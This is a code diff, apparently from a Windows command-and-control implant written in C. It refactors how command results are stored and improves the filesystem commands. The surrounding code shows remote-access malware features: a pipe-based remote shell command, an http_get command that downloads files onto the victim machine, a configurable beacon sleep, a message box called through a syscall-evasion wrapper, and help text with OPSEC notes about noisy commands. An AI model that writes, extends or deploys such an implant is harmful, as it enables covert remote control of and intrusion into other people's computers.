@@ -17,6 +17,7 @@
 
     may need to split into .c and .h as well
 */
+void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);
 
 void get_username(OutboundJsonDataStruct* response_struct);
 int parse_command(char* command, char* args, OutboundJsonDataStruct*);
@@ -28,7 +29,7 @@ void help(OutboundJsonDataStruct*);
 
 //filesystem stuff
 void mkdir(OutboundJsonDataStruct* response_struct, char* args);
-void rmdir_win(OutboundJsonDataStruct* response_struct, char* args);
+void rmdir(OutboundJsonDataStruct* response_struct, char* args);
 void cd(OutboundJsonDataStruct* response_struct, char* args);
 void pwd(OutboundJsonDataStruct* response_struct);
 
@@ -93,10 +94,57 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     }
     else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
-        response_struct->command_result_data = "Unknown command";
+        set_response_data(response_struct, "Unknown command");
     }
     return 0;
 }
+// ====================
+// Helper funcs
+// ====================
+
+/**
+ * @brief Allocates and sets the command_result_data field in the response struct.
+ *
+ * This function dynamically allocates memory and copies the given string (`data`)
+ * into the `command_result_data` field of `response_struct`. If memory was already
+ * allocated for `command_result_data`, it is freed before assigning the new value.
+ *
+ * @param response_struct Pointer to the OutboundJsonDataStruct where data should be stored.
+ * @param data The string to be copied into response_struct->command_result_data.
+ *
+ * @note The caller is responsible for ensuring response_struct is a valid, allocated pointer.
+ * @note The caller must free response_struct->command_result_data before deallocating response_struct.
+ * @note This function uses `_strdup`, which internally calls `malloc`. If memory allocation fails,
+ *       `command_result_data` remains NULL and a debug log is printed.
+ *
+ * @example
+ * ```c
+ * OutboundJsonDataStruct* response = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));
+ * if (!response) {
+ *     printf("Memory allocation failed for response_struct.\n");
+ *     return 1;
+ * }
+ * 
+ * set_response_data(response, "Operation successful");
+ * printf("Response: %s\n", response->command_result_data);
+ * 
+ * // Cleanup
+ * free(response->command_result_data);
+ * free(response);
+ * ```
+ */
+void set_response_data(OutboundJsonDataStruct* response_struct, const char* data) {
+    if (response_struct->command_result_data) {
+        free(response_struct->command_result_data);
+    }
+    
+    response_struct->command_result_data = _strdup(data); // _strdup dynamically allocates and copies the string
+    if (!response_struct->command_result_data) {
+        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
+    }
+}
+
+
 // ====================
 // Commands
 // ====================
@@ -124,7 +172,8 @@ void get_username(OutboundJsonDataStruct* response_struct)
             free(response_struct->command_result_data);
 
             // Assign new UTF-8 string to response_struct->command_result_data
-            response_struct->command_result_data = utf8_username;
+            set_response_data(response_struct, utf8_username);
+
         }
     } else {
         DEBUG_LOGW(L"Failed to get username. Error: %lu\n", GetLastError());
@@ -157,9 +206,8 @@ void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
     if (url == NULL || file_path == NULL) {
         DEBUG_LOGF(stderr, "Invalid arguments. Expected: <URL> <FilePath>\n");
         // put message in response struct abuot invalid args
-        response_struct->command_result_data = "Invalid arguments. Expected: <URL> <FilePath>"; // fine to do this
-                                                                                 // like this as it's
-                                                                                 // read only.
+
+        set_response_data(response_struct, "Invalid arguments. Expected: <URL> <FilePath>");
         return;
     }
 
@@ -170,12 +218,14 @@ void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
         DEBUG_LOG("Something went wrong downloading the file");
         // put error message in response struct
         // fine to do this like this as it's read only.
-        response_struct->command_result_data = "Something went wrong downloading the file";
+        set_response_data(response_struct, "Something went wrong downloading the file");
+
         return;
     }
 
     // fine to do this like this as it's read only.
-    response_struct->command_result_data = "Successfuly downloaded file";
+    set_response_data(response_struct, "Successfuly downloaded file");
+
 }
 
 // Keep
@@ -279,9 +329,11 @@ void shell(OutboundJsonDataStruct* response_struct, char* args)
     // ====================
 
     // put into struct
-    free(response_struct->command_result_data);
+    free(response_struct->command_result_data); //might need to get rid of this
     // Assign new UTF-8 string to response_struct->command_result_data
-    response_struct->command_result_data = buffer_PIPE_READ_SIZE_BUFFER;
+    set_response_data(response_struct, buffer_PIPE_READ_SIZE_BUFFER);
+
+
 
     // ====================
     // Cleanup
@@ -305,7 +357,7 @@ void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
 
     // Call the WhisperMessageBoxA function
     WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
-    response_struct->command_result_data = "Message box popped successfully";
+    set_response_data(response_struct, "Message box popped successfully");
 }
 
 // Keep
@@ -322,7 +374,8 @@ void sleep(OutboundJsonDataStruct* response_struct, char* args) {
     //shitty int check
     if (scanf("%d", &sleep_arg) == 0) {
         DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
-        response_struct->command_result_data = "[ERROR] sleep: Expected: <int: sleeptime (seconds)>";
+        set_response_data(response_struct, "[ERROR] sleep: Expected: <int: sleeptime (seconds)>");
+
         return;
     }
 
@@ -331,14 +384,18 @@ void sleep(OutboundJsonDataStruct* response_struct, char* args) {
     DWORD dwTime = (DWORD)sleep_arg;  // or (DWORD)(seconds * 1000) if needed in ms
 
     set_sleep_time(dwTime);
-    response_struct->command_result_data = "Sleep set successfully";
+        set_response_data(response_struct, "Sleep set successfully");
     return;
 }
 
 // Keep
-void help(OutboundJsonDataStruct* response_struct)
-{
+void help(OutboundJsonDataStruct* response_struct) {
     const char* help_string = "Help:\n\
+> File System Commands:\n\
+    mkdir: (mkdir <str: directory>): Creates a new directory.\n\
+    rmdir: (rmdir <str: directory>): Removes a directory.\n\
+    cd: (cd <str: directory>): Changes the current directory.\n\
+    pwd: (pwd): Prints the current working directory.\n\
 > Loud Commands\n\
 	http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
 		[ OPSEC: Will write file to disk ]\n\
@@ -350,10 +407,8 @@ void help(OutboundJsonDataStruct* response_struct)
     sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
 ";
 
-    response_struct->command_result_data = help_string;
-    return;
+    set_response_data(response_struct, help_string);
 }
-
 
 /*
 Directory Commands
@@ -370,31 +425,47 @@ Still need some work
     Create a directory 
 */
 void mkdir(OutboundJsonDataStruct* response_struct, char* args) {
-    char* context = NULL; // Required for strtok_s & thread safety.
+    char* context = NULL;
     char* path_arg = strtok_s(args, " ", &context);
+
+    if (path_arg == NULL) {
+        set_response_data(response_struct, "Missing directory path argument");
+        return;
+    }
 
     if (CreateDirectoryA(path_arg, NULL)) {
         DEBUG_LOG("Directory created: %s\n", path_arg);
+        set_response_data(response_struct, "Directory created");
     } else {
-        DEBUG_LOG("CreateDirectory failed. Error: %lu\n", GetLastError());
+        DWORD error = GetLastError();
+        DEBUG_LOG("CreateDirectory failed. Error: %lu\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message); // Include error message in response
     }
 }
 
 /* 
     Remove a directory 
 */
-void rmdir_win(OutboundJsonDataStruct* response_struct, char* args) {
-    char* context = NULL; // Required for strtok_s & thread safety.
+void rmdir(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
     char* path_arg = strtok_s(args, " ", &context);
+
+    if (path_arg == NULL) {
+        set_response_data(response_struct, "Missing directory path argument");
+        return;
+    }
 
     if (RemoveDirectoryA(path_arg)) {
         DEBUG_LOG("Directory removed: %s\n", path_arg);
-        response_struct->command_result_data = "Directory removed";
-
+        set_response_data(response_struct, "Directory removed");
     } else {
-        DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", GetLastError());
-        response_struct->command_result_data = "Directory removal failed";
-
+        DWORD error = GetLastError();
+        DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message); // Include error message in response
     }
 }
 
@@ -402,19 +473,25 @@ void rmdir_win(OutboundJsonDataStruct* response_struct, char* args) {
     Change directory 
 */
 void cd(OutboundJsonDataStruct* response_struct, char* args) {
-    char* context = NULL; // Required for strtok_s & thread safety.
+    char* context = NULL;
     char* path_arg = strtok_s(args, " ", &context);
-    
+
+     if (path_arg == NULL) {
+        set_response_data(response_struct, "Missing directory path argument");
+        return;
+    }
+
     if (SetCurrentDirectoryA(path_arg)) {
         DEBUG_LOG("Changed directory to: %s\n", path_arg);
-
-        //could have a better response here, like "Current path is: path"
-        response_struct->command_result_data = path_arg;
-
+        char cwd[MAX_PATH];
+        GetCurrentDirectoryA(MAX_PATH, cwd); // Get the actual current directory
+        set_response_data(response_struct, cwd); // Respond with the full current directory
     } else {
-        DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", GetLastError());
-        response_struct->command_result_data = "SetCurrentDirectory failed";
-
+        DWORD error = GetLastError();
+        DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message); // Include error message in response
     }
 }
 
@@ -425,16 +502,15 @@ void pwd(OutboundJsonDataStruct* response_struct) {
     char cwd[MAX_PATH];
     if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
         DEBUG_LOG("Current working directory: %s\n", cwd);
-        //not returning full dir, might have to allocate some stuff for it?
-        response_struct->command_result_data = cwd;
-
+        set_response_data(response_struct, cwd);
     } else {
-        DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", GetLastError());
-        response_struct->command_result_data = "GetCurrentDirectory failed";
-
+        DWORD error = GetLastError();
+        DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message); // Include error message in response
     }
 }
-
 
 /*
  Stub commands for things that can to be added for more functionality
